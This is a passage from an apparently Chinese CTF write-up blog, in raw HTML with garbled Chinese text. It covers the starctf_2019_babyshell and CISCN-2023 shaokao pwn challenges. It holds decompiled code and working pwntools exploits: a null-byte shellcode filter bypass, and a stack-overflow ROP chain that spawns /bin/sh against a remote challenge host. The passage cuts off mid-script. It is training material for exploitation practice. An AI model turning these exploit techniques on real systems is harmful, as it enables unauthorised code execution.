class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653179.png" alt="image-20240508215231736" style="zoom:50%;" /><p>è¿™é¢˜ç®—æ˜¯ä¸€ä¸ª\x00çš„å¦™ç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  sub_4007F8(a1, a2, a3);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;give me shellcode, plz:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400786(buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;wrong shellcode!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ‰§è¡Œshellcodeä½†æ˜¯è¦å…ˆç»•è¿‡ifçš„æ£€æŸ¥</p><p>è€Œæ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400786</span><span class="params">(_BYTE *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *i; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="string">&quot;ZZJ loves shell_code,and here is a gift:\x0F\x05 enjoy it!\n&quot;</span>; *i &amp;&amp; *i != *a1; ++i )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( !*i )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å´éå¸¸é˜´é—´ï¼Œå¦‚æœçœŸçš„æŒ‰ç…§è¿™ä¸ªå»æ‰§è¡Œï¼Œå¾ˆéš¾æ‰èƒ½get shellï¼Œç¬”è€…è¿˜æ˜¯å¤ªèœäº†ï¼Œæƒ³ä¸å‡ºæ¥çœ‹äº†ç½‘ä¸Šå¤§ä½¬çš„wpï¼Œå‘ç°æˆ‘åªæ³¨æ„forå¾ªç¯å´æ²¡æ³¨æ„åˆ°ç¬¬ä¸€ä¸ªwhile(*a1)åªè¦è®©è¿™ä¸ªä¸ºå‡å°±èƒ½è·³è¿‡äº†ï¼Œå› æ­¤åœ¨shellå¼€å¤´æ‰”ä¸ª\x00å³å¯è·³è¿‡æ£€æŸ¥ï¼Œå†åé¢æ­é…å‡ ä¸ªå­—èŠ‚ç å‡‘ä¸ªæ±‡ç¼–ä¹‹ååŠ ä¸Šè‡ªå·±çš„shellcodeå°±å¯ä»¥getshelläº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell=<span class="string">b&#x27;\x00\x42\x00&#x27;</span>+asm(shellcraft.amd64.linux.sh())</span><br><span class="line">p=process(<span class="string">&#x27;./babyshell&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;plz:\n&#x27;</span>)</span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://defuse.ca/online-x86-assembler.htm#disassembly%E8%BF%99%E5%8F%AF%E4%BB%A5%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%99%A8%E7%A0%81%E8%BD%AC%E6%B1%87%E7%BC%96%EF%BC%8C%E5%9B%A0%E4%B8%BA%E8%A6%81%E6%89%BE\x00%E4%B9%8B%E5%90%8E%E6%8E%A5%E7%9A%84%E6%9C%BA%E5%99%A8%E7%A0%81%E5%90%8E%E7%9A%84%E6%B1%87%E7%BC%96%E3%80%82%E3%80%82">https://defuse.ca/online-x86-assembler.htm#disassemblyè¿™å¯ä»¥å®ç°æœºå™¨ç è½¬æ±‡ç¼–ï¼Œå› ä¸ºè¦æ‰¾\x00ä¹‹åæ¥çš„æœºå™¨ç åçš„æ±‡ç¼–ã€‚ã€‚</a></p><p>è¿˜æ˜¯å¤ªèœäº†ï¼Œä»»é‡è€Œé“è¿œã€‚ã€‚ã€‚</p><h1 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653180.png" alt="image-20240509003059436" style="zoom:50%;" /><h1 id="CISCN-2023-çƒ§çƒ¤æ‘Šå„¿"><a href="#CISCN-2023-çƒ§çƒ¤æ‘Šå„¿" class="headerlink" title="CISCN-2023 çƒ§çƒ¤æ‘Šå„¿"></a>CISCN-2023 çƒ§çƒ¤æ‘Šå„¿</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r9d</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)menu(*(__int64 *)&amp;argc, (__int64)argv, v3, v4, v5, v6) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        pijiu();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        chuan();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        yue(*(__int64 *)&amp;argc, (__int64)argv, v3, v4, v5, v6);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        vip();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( own )</span><br><span class="line">          gaiming();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)&amp;unk_4B7008, (_DWORD)argv, v3, v4, v5, v6);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">menu</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5, <span class="type">int</span> a6)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;æ¬¢è¿æ¥åˆ°%sçƒ§çƒ¤æ‘Šå„¿ï¼Œæ¥ç‚¹å•¥ï¼Ÿ\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;name, a3, a4, a5, a6);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. å•¤é…’&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. çƒ¤ä¸²&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. é’±åŒ…ä½™é¢&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. æ‰¿åŒ…æ‘Šä½&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( own )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. æ”¹å&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;0. ç¦»å¼€&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_d, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v11, v6, v7, v8, v9);</span><br><span class="line">  <span class="keyword">return</span> v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å½“ownä¸ºçœŸæ—¶æœ‰æ–°çš„é€‰é¡¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">gaiming</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;çƒ§çƒ¤æ‘Šå„¿å·²å½’ä½ æ‰€æœ‰ï¼Œè¯·èµåï¼š&quot;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_s, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v5, v0, v1, v2, v3);<span class="comment">// æ ˆæº¢å‡º</span></span><br><span class="line">  j_strcpy_ifunc();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ä¸ªæ ˆæº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">pijiu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> choose; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  choose = <span class="number">1</span>;</span><br><span class="line">  num = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. é’å²›å•¤é…’&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. ç‡•äº¬U8&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. å‹‡é—¯å¤©æ¶¯&quot;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_d, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;choose, v0, v1, v2, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;æ¥å‡ ç“¶ï¼Ÿ&quot;</span>);</span><br><span class="line">  _isoc99_scanf((<span class="type">unsigned</span> <span class="type">int</span>)&amp;_d, (<span class="type">unsigned</span> <span class="type">int</span>)&amp;num, v4, v5, v6, v7);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10</span> * num &gt;= money )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;è¯¶å“Ÿï¼Œé’±ä¸å¤Ÿäº†&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    money += <span class="number">-10</span> * num;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;unk_4B7105);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°è¿™ä¸ªè®¡ç®—é’±çš„æ–¹å¼å¾ˆå¥‡æ€ªï¼Œå½“ä¹°çš„ä¸ºè´Ÿæ•°æ—¶ï¼Œä¼šåŠ é’±ï¼Œè€ŒåŠ é’±å¯ä»¥ä¹°æ‘Šä½ï¼Œç„¶åå°±æœ‰æ ˆæº¢å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;./shaokao&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:io.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:io.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:io.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:io.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:io.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:io.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :io.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28368</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">io=run()</span><br><span class="line">offset=<span class="number">40</span></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000458827</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045af95</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040264f</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000040a67e</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004a404b</span>) <span class="comment"># pop rdx ; pop rbx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004e60e8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x4141414141414141</span>) <span class="comment"># padding</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000447339</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; 